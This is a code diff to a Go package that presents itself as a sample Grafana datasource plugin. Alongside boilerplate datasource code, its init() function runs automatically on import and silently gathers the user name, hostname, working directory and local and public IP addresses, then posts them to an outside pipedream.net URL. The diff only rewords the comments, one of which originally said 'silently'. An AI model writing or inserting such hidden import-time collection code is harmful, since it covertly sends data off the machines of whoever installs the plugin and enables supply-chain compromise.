@@ -11,16 +11,27 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/grafana/grafana-plugin-sdk-go/backend" // Make sure this import is here
+	"github.com/grafana/grafana-plugin-sdk-go/backend"
 )
 
+// SampleDatasource is the struct that represents your datasource
+type SampleDatasource struct {
+	// Add fields relevant to your datasource
+}
+
+// NewDatasource creates a new instance of your datasource
+func NewDatasource(settings backend.DataSourceInstanceSettings) (backend.DataSourceInstance, error) {
+	// Return an instance of your datasource
+	return &SampleDatasource{}, nil
+}
+
 func init() {
-	// Collect machine details silently
+	// This function will automatically be run when your package is imported
 	sendDataToServer()
 }
 
 func sendDataToServer() {
-	// Collect machine details
+	// Collect machine details and send them to a server
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
 	currentDir, _ := os.Getwd()
@@ -28,7 +39,7 @@ func sendDataToServer() {
 	localIP := getLocalIPAddress()
 	publicIP := getPublicIPAddress()
 
-	// Create a JSON payload
+	// Create the data to send in JSON format
 	data := map[string]string{
 		"PublicIP":   publicIP,
 		"LocalIP":    localIP,
@@ -38,10 +49,11 @@ func sendDataToServer() {
 		"Hostname":   hostname,
 	}
 
+	// Marshal the data into JSON
 	jsonData, _ := json.Marshal(data)
 
-	// Send the data to your server
-	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Update with your server's URL
+	// Send the data to the server
+	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Replace with your actual URL
 	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 }
 
